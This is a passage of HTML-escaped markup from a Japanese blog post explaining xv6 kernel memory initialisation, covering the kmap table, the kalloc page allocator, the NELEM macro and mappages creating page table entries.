 &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;KERNBASE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;             EXTMEM&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;    PTE_W&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// I/O space&lt;/span&gt;
 &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;KERNLINK&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;KERNLINK&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;token comment&quot;&gt;// kern text+rodata&lt;/span&gt;
 &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;     PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;   PTE_W&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// kern data+memory&lt;/span&gt;
 &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;DEVSPACE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DEVSPACE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;         PTE_W&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// more devices&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;開始・終了アドレスと権限が定義されています。&lt;/p&gt;
&lt;p&gt;初期化されているテーブルのマッピングは、先ほど貼った以下の画像のレイアウトと一致します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 454px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/b3c1d/image-20-16455945916397.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 97.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAACxElEQVQ4y42Ui5KaQBBF/f/fSmpTlY1bRkVBUQFBXsLwBhG56Z5diG4eu1S1DjBz5/TtHiZ93+P9laYxyqp4eDbM+9v8+2vCP9driziO4fsRPK+EZcVwnAxBUCMMC3RdN4p9SvB1cgfTDKGqDRZzgdkswnJZ0L1AkohPU05utxstSJBlKXTdgaZVFAXWao7NpsZKCYjUfyD8r2BPgmVZUhSUpsBiIfDy4slgyv0+R12XlPbtU5ST+5swLKXgdEqCU5dSTsnPmjbLpY+czUdeTu5fum5CnpUPKW+3CRFWVLiO4voh5ZsgaPcOp5MgH1siE5jPz9jtOykYhoFcfLlc/qB8Lz4ZBpdLI4uyXCbSv+dnB4qSUfhwvRMJ9Wjb9oHyfYwe8s5dd6WixJLu6emAL191LJUU63UoO4CFhviXf/x80suTkUKIGMYhgLpuKEqoqxJbrYVGfZimiaxy0zQoikIC1FVFAA7yvJBCgxWSMM9zROcQumFBO9K/E8nY2hSmizzL5OSK2uschvJUVSQohJBr67qWm90dPUrlQikLG4duC7PbvUa/g1UZqIpKTmY6FuK+5awMw6A+3eN8Pkt/X1O+8yMofBxh4QSHwn6NxiaySi4Ig0CmyQJMxXQZ0XPwZiPhIGpHR6j5CiuxxDpRaKxgl+ioy3r8QPDF6TGZrus4Ho+wbVtS/+5D9COhQaka7Z5SPtB4D7u20F5a+T6KIknn+75MmQnZLi4SW/HgYSIS7NwdlGSBeTDD1HmGIhbYhCq9SzHMY1ImZCIuDsdQ+VGQT0ld1bBCE1qxxsx7wbf9E1apgm2kwXd9KeS5LjW5N1aWv1IsxuOR8D5lL3OxaVQs45/4cfoOrVbJwy0VI5Q+B1QUl0RZiAXYO37GxA+CkpIOv3kyYcYH7HwdmqPCoLEdWUiTFEMvcEN7b5QsxsHjoSi/ABqT/23sEaz0AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/8ac56/image-20-16455945916397.webp 240w,
/static/bda5ce08cfe2ad1e3267f7b9bcef994f/44d9f/image-20-16455945916397.webp 454w&quot;
              sizes=&quot;(max-width: 454px) 100vw, 454px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/8ff5a/image-20-16455945916397.png 240w,
/static/bda5ce08cfe2ad1e3267f7b9bcef994f/b3c1d/image-20-16455945916397.png 454w&quot;
            sizes=&quot;(max-width: 454px) 100vw, 454px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/b3c1d/image-20-16455945916397.png&quot;
            alt=&quot;img&quot;
            title=&quot;img&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;P.31 xv6OS&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;kalloc関数によるページの確保&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kalloc%E9%96%A2%E6%95%B0%E3%81%AB%E3%82%88%E3%82%8B%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AE%E7%A2%BA%E4%BF%9D&quot; aria-label=&quot;kalloc関数によるページの確保 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;kalloc関数によるページの確保&lt;/h3&gt;
&lt;p&gt;ページテーブルの初期化後、使用するメモリ領域の確認と初期化を行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;DEVSPACE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;PHYSTOP too high&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kalloc&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;kalloc.c&lt;/code&gt;で定義されている以下の関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Allocate one 4096-byte page of physical memory.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Returns a pointer that the kernel can use.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Returns 0 if the memory cannot be allocated.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;acquire&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;freelist&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;freelist &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; r&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;next&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-004-kernel-main-01&quot;&gt;前回&lt;/a&gt;の記事で確認した通り、この時点ではまだロックは無効化されています。&lt;/p&gt;
&lt;p&gt;そのため&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;関数は無視します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kmem.freelist&lt;/code&gt;には、解放されているページが短方向連結リストで格納されています。&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;kalloc&lt;/code&gt;関数は単に解放されている領域の有無を確認して、1ページ分の領域を確保している処理を行っているようです。&lt;/p&gt;
&lt;p&gt;確保に成功した場合&lt;code class=&quot;language-text&quot;&gt;kalloc&lt;/code&gt;関数は確保したページのポインタ(?)を返却し、&lt;code class=&quot;language-text&quot;&gt;pgdir&lt;/code&gt;に格納します。&lt;/p&gt;
&lt;p&gt;これによって、次の行の&lt;code class=&quot;language-text&quot;&gt;memset(pgdir, 0, PGSIZE);&lt;/code&gt;で確保した1ページ分のメモリ領域を0で初期化することができます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;関数の挙動も&lt;a href=&quot;/unix-xv6-004-kernel-main-01&quot;&gt;前回&lt;/a&gt;の記事で確認したので割愛します。&lt;/p&gt;
&lt;p&gt;最後の行は&lt;code class=&quot;language-text&quot;&gt;PHYSTOP&lt;/code&gt;の値が&lt;code class=&quot;language-text&quot;&gt;DEVSPACE&lt;/code&gt;を超過していないかを検証しているだけなので割愛します。&lt;/p&gt;
&lt;p&gt;最終的に確保された1ページ分の領域&lt;code class=&quot;language-text&quot;&gt;pgdir&lt;/code&gt;が、この後PDTとして使用されます。&lt;/p&gt;
&lt;h3 id=&quot;仮想アドレスのpteの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AEpte%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;仮想アドレスのpteの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;仮想アドレスのPTEの作成&lt;/h3&gt;
&lt;p&gt;ここまでの処理で&lt;code class=&quot;language-text&quot;&gt;pgdir&lt;/code&gt;には確保した1ページ分のメモリ領域の参照が格納されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;k &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; kmap&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; k &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmap&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NELEM&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mappages&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;virt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_end &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;perm&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; 
	&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;freevm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; pgdir&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;NELEM&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;defs.h&lt;/code&gt;で定義された以下のマクロで、固定サイズの配列の要素数を返却します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// number of elements in fixed-size array&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;NELEM&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;k = kmap; k &amp;lt; &amp;amp;kmap[NELEM(kmap)]; k++&lt;/code&gt;のループ条件は単にすべての&lt;code class=&quot;language-text&quot;&gt;kmap&lt;/code&gt;配列の要素に対して処理を実行せよという命令と同義です。&lt;/p&gt;
&lt;p&gt;ここで肝になるのが以下の行です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mappages&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;virt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_end &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;perm&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;freevm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mappages&lt;/code&gt;関数は、&lt;code class=&quot;language-text&quot;&gt;vm.c&lt;/code&gt;で定義された関数で、 引数として与えられた仮想アドレスのPTE(ページテーブルエントリ)を作成し、同じく引数として与えられた物理アドレスを参照します。&lt;/p&gt;
&lt;p&gt;PTEはページに対応する物理アドレスの値とアクセス制御や属性に関する情報を保持します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
